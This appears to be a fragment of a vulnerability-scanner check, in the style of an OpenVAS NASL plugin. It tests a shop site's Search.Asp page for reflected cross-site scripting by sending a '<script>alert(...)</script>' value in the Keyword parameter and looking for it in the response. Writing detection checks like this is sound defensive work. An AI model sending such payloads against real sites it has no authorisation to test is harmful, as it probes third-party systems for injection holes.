...
foreach dir( make_list_unique( "/shop", http_cgi_dirs( port:port ) ) ) {
  ...
  if( dir == "/" ) dir = "";
  url = string(dir, "/en/Search.Asp?Range=Product&Keyword=<script>alert(/", vt_strings["lowercase"], "/)</script>");

  if( http_vuln_check( port:port, url: url, pattern:"<script>alert\(/" + vt_strings["lowercase"] + "/\)</script>", check_header:TRUE, extra_check:make_list( "Search","Products" ) ) ) {
